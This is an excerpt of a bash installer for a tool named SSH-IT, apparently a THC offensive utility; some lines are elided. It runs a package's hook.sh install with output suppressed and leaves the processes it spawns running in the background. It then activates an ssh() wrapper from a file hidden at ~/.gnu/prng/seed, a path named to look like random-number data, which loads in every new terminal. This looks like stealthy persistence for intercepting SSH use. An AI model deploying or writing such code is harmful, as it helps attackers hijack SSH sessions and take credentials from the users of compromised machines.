...
init_vars()
{
	...
	# Only clean up inside THC_TMPDIR, never remove a local directory with the same name
	rm -rf "${THC_TMPDIR:?}/${PKG_NAME}" 2>/dev/null
...
export THC_TESTING
export THC_DEPTH
(cd "${THC_TMPDIR}/${PKG_NAME}" && "./hook.sh" install) 2>/dev/null || errexit;

# Give background processes spawned by hook.sh time to cd out of tmpdir
# before clean() removes it (prevents getcwd errors in orphaned processes)
read -r -t 1 </dev/null 2>/dev/null; true

clean

# Post-install: activate ssh() wrapper in the current shell session
_SEED_FILE="${HOME}/.gnu/prng/seed"
if [[ -f "${_SEED_FILE}" ]]; then
	echo -e "\n${CG}[+] SSH-IT installed successfully.${CN}"
	echo -e "${CY}[!] Activate in this shell session:${CN}"
	echo -e "    ${CC}source ${_SEED_FILE}${CN}"
	echo -e "    ${CY}(or open a new terminal — it activates automatically)${CN}\n"
fi
